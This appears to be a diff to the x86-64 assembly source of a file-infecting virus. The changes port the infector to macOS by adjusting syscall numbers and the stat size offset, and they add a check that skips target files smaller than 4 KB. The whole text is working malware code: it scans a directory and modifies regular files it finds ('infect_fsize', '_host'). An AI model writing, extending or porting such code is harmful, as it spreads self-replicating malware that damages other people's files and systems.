@@ -27,6 +27,7 @@ puts:           call        strlen
                 mov         rax, __NR_write
 %elifidn __OUTPUT_FORMAT__, macho64
                 mov         rax, Darwin__NR_write
+                or          rax, 0x02000000
 %endif
                 syscall
                 ret
@@ -39,6 +40,7 @@ _host:          lea         rdi, [rel hello]
                 mov         rax, __NR_exit
 %elifidn __OUTPUT_FORMAT__, macho64
                 mov         rax, Darwin__NR_exit
+                or          rax, 0x02000000
 %endif
                 syscall
 hello           db          "hello world",33,10,0
@@ -137,7 +139,7 @@ scandir:        lea         r10, [rsp-0x28]                     ;long *basep for
                 mov         al, byte [rdi + rdx]                ; linux d_type
                 inc         edx
                 add         rdi, 18                             ; linux d_name
-.increment_idx:                
+.increment_idx:
                 add         r13, rdx
 
                 cmp         al, DT_REG
@@ -178,8 +180,14 @@ process:                                                         ; expecting fil
                 cmp         rax, 0
                 jnz         .close
 
-                mov         rax, qword [rsp - (0x148-0x30)]     ; st_size
+                mov         rax, qword [rsp - (0x148-0x30)]     ; linux st_size
+                test        r15b, r15b
+                jz          .st_size
+                mov         rax, qword [rsp - (0x148-0x48)]     ; macos st_size
+.st_size:
                 mov         [rsp-0x50], rax                     ; rsp-0x50 = infect_fsize
+                cmp         rax, 0x1000                         ; file too small
+                jl          .close
 
                 xor         r9, r9
                 mov         r8, [rsp-0x48]
